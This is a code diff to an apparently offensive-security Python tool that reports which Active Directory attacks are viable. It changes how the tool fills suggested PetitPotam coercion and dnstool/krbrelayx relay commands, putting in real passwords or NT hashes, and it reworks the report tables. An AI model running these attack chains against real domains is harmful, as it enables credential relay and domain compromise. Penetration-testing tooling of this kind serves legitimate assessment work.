@@ -221,6 +221,13 @@ def _build_attack_chains(
     _raw_user = env_summary.get("user", "<user>")
     username  = _raw_user.split("\\")[-1] if "\\" in _raw_user else _raw_user
 
+    # Credential for terminal-displayed attack chains. Falls back to placeholder
+    # if the field is absent (e.g. when called from report writers, which must
+    # never read or emit the password/nt_hash fields from env_summary).
+    _nt_hash  = env_summary.get("nt_hash")
+    _password = env_summary.get("password") or ""
+    _cred_p   = f"-H {_nt_hash}" if _nt_hash else f"-p '{_password}'"
+
     def _coerce_cmd(target: str) -> str:
         """Best available coercion command for a target."""
         # Check WebClient status from any module that includes the optional WebClient check
@@ -230,9 +237,9 @@ def _build_attack_chains(
             # The listener argument MUST be a hostname (not IP) — Windows will only follow
             # a WebDAV UNC path to a hostname; an IP triggers SMB, not WebDAV.
             return (f"# Coerce authentication from target\n"
-                    f"  python3 PetitPotam.py -u {username} -p '<password>' -d {domain} {attacker_hostname}@80/share {target}")
+                    f"  python3 PetitPotam.py -u {username} {_cred_p} -d {domain} {attacker_hostname}@80/share {target}")
         return (f"# Coerce authentication from target\n"
-                f"  python3 PetitPotam.py -u {username} -p '<password>' -d {domain} {attacker_hostname} {target}")
+                f"  python3 PetitPotam.py -u {username} {_cred_p} -d {domain} {attacker_hostname} {target}")
 
     # ── 1. DCSync via ACL Abuse ────────────────────────────────────
     acl_ar = _get_ar("ACL Abuse")
@@ -304,7 +311,7 @@ def _build_attack_chains(
             coerce_cmd=(
                 f"# Register Forshaw DNS A-record pointing to attacker\n"
                 f"  dnstool.py -u '{domain}\\{username}' "
-                f"-p '<pass>' -r '{_forshaw_name(dc_ip)}' -a add -d {attacker} -t A --tcp {dc_ip}\n"
+                f"{_cred_p} -r '{_forshaw_name(dc_ip)}' -a add -d {attacker} -t A --tcp {dc_ip}\n"
                 f"\n"
                 f"# Start krbrelayx listener\n"
                 f"  sudo krbrelayx.py -t 'http://{krb_ca_host}/certsrv/certfnsh.asp' "
@@ -313,7 +320,7 @@ def _build_attack_chains(
                 f"-ip {attacker}\n"
                 f"\n"
                 f"# Coerce DC to authenticate to the Forshaw DNS name\n"
-                f"  python3 PetitPotam.py -u '{username}' -p '<pass>' -d {domain} "
+                f"  python3 PetitPotam.py -u '{username}' {_cred_p} -d {domain} "
                 f"'{_forshaw_name(dc_ip)}' {dc_ip}"
             ),
             relay_cmd=None,
@@ -693,17 +700,22 @@ def _print_rich_summary_table(results: list[AttackResult]) -> None:
     tbl.add_column("Attack",               style="bold white", min_width=38)
     tbl.add_column("Viable?",              justify="center",   min_width=14)
     tbl.add_column("Failed Prerequisites",                     min_width=38)
-    tbl.add_column("Warnings / Skipped",                       min_width=30)
+    tbl.add_column("Warnings / Optional / Skipped",            min_width=30)
 
     for ar in results:
         style, label = VIABILITY_STYLE.get(ar.viability, ("dim", ar.viability))
         failed  = ", ".join(ar.missing) or "—"
-        skipped = ", ".join(ar.skipped) or "—"
+        # Combine: optional FAILs first (explain PARTIAL), then WARNs, then SKIPs
+        notices = []
+        notices += ar.optional_failed
+        notices += [c.name for c in ar.checks if c.status == Status.WARN]
+        notices += ar.skipped
+        notices_str = ", ".join(notices) or "—"
         tbl.add_row(
             ar.attack_name,
             Text(label, style=style),
-            Text(failed,  style="red"    if ar.missing  else "dim"),
-            Text(skipped, style="yellow" if ar.skipped  else "dim"),
+            Text(failed,       style="red"    if ar.missing  else "dim"),
+            Text(notices_str,  style="yellow" if notices     else "dim"),
         )
 
     console.print(tbl)
@@ -769,7 +781,11 @@ def _print_plain_summary_table(results: list[AttackResult]) -> None:
         _, label = VIABILITY_STYLE.get(ar.viability, ("", ar.viability))
         label  = label.replace("✅ ", "").replace("⚠️  ", "").replace("❌ ", "").replace("❓ ", "")
         failed = ", ".join(ar.missing) or "none"
+        notices = ar.optional_failed + [c.name for c in ar.checks if c.status == Status.WARN] + ar.skipped
+        notices_str = ", ".join(notices) or "none"
         print(f"{ar.attack_name:<42} {label:<14} {failed}")
+        if notices:
+            print(f"  {'':42} {'':14} Warnings/Optional/Skipped: {notices_str}")
 
     print()
 
@@ -911,8 +927,8 @@ def write_markdown_report(
     # ── Executive summary table ────────────────────────────────────
     a("## Executive Summary")
     a("")
-    a("| Attack | Viability | Failed Prerequisites |")
-    a("|--------|-----------|----------------------|")
+    a("| Attack | Viability | Failed Prerequisites | Warnings / Optional / Skipped |")
+    a("|--------|-----------|----------------------|-------------------------------|")
 
     for ar in results:
         _, label = VIABILITY_STYLE.get(ar.viability, ("", ar.viability))
@@ -925,7 +941,13 @@ def write_markdown_report(
             .replace("❓ ", "❓ ")
         )
         failed = ", ".join(f"`{m}`" for m in ar.missing) or "—"
-        a(f"| {ar.attack_name} | {md_label} | {failed} |")
+        notices = (
+            [f"`{n}` *(optional fail)*" for n in ar.optional_failed]
+            + [f"`{c.name}` *(warn)*" for c in ar.checks if c.status == Status.WARN]
+            + [f"`{s}` *(skipped)*" for s in ar.skipped]
+        )
+        notices_str = ", ".join(notices) or "—"
+        a(f"| {ar.attack_name} | {md_label} | {failed} | {notices_str} |")
 
     a("")
     a("---")
